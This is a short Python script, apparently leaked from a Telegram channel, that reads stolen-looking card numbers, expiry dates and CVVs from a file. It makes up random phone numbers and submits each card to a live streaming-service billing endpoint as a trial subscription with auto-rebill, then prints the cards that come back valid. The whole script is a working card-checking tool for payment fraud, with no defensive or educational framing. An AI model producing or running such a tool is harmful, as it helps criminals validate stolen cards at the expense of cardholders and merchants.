from time import sleep
from requests import post,get
from random import choice
#слито в @smoke_software
with open('cards.txt','r+')as g:
    d=g.read().replace(' ','|').replace('/','|').split('\n')

#слито в @smoke_software
gayf = d



def st(i):
    phone = "79" + "".join(choice("0123456789") for i in range(9))
    card = i.split("|")[0]
    mm = i.split("|")[1]
    yy = i.split("|")[2]
    cvc = i.split("|")[3] 
    huy = get(
        f"https://api.kino.1tv.ru/1.4/checkCard?msisdn={phone}&client=web"
    ).text
    huy1 = post(
        "https://payment.kino.1tv.ru/billing/subsUnitellerDirect",
        headers={
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; POCO M3 / Redmi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36",
        },
        data={
            "msisdn": phone,
            "pan": card,
            "cardholder": "MEGOGO",
            "exp_year": '20'+ yy,
            "exp_month": mm,
            "cvv": cvc,
            "client": "web",
            "send_receipt": False,
            "type": "trial_7",
            "autorebill": True,
            "channel": "subs_page",
            "mobile": True,
            "flow[from]": "subs",
            "flow[from_block]": "subs_sidebar_block",
            "flow[from_position]": "0",
        },
    ).json()
    if 'card_exist' in huy1 or 'access_token' in huy1:
        print(f'------- VALID: {i}')
    elif huy1['error']['message'] == 'Ошибка при оплате. Проверьте баланс карты и повторите попытку еще раз.':
        pass
    else:
        print(i,huy1)
for i in gayf:
    st(i)
    #слито в @smoke_software